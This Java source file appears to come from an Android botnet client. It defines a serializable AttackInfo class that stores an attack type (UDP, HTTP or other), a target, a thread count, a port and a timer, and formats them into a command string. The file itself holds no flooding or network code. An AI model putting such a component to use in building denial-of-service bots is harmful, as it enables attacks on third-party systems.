package com.example.botclient.SteganoGraphy;

import android.util.Log;
import java.io.Serializable;

public class AttackInfo implements Serializable
{
    private String attackType,starget;
    private int sthreads,stimer,sport;
    private String response;

    public AttackInfo(){}

    public AttackInfo(String response)
    {
        this.response = response;
    }

    public AttackInfo(String attackType, String starget, int sthreads, int sport, int stimer) {
        this.starget = starget;
        this.attackType = attackType;
        this.sthreads = sthreads;
        this.sport = sport;
        this.stimer = stimer;
    }

    public AttackInfo(String attackType, String starget, int sthreads, int stimer) {
        this.starget = starget;
        this.attackType = attackType;
        this.sthreads = sthreads;
        this.stimer = stimer;
    }

    public String getTypeofAttack() { return attackType; }

    public String getStarget() {
        return starget;
    }

    public int getSport() {
        return sport;
    }

    public int getSthreads() {
        return sthreads;
    }

    public int getStimer() {return stimer;}


    @Override
    public String toString()
    {
        if(attackType.equals("UDP"))
        {
            return attackType + " " + starget + " " + sthreads + " " + stimer;
        }
        else if(attackType.equals("HTTP"))
        {
            return attackType + " " + starget + " " + sthreads + " " + stimer;
        }
        else
        {
            return attackType + " " + sthreads + " " + sport + " " + stimer + " " + starget;
        }
    }
}
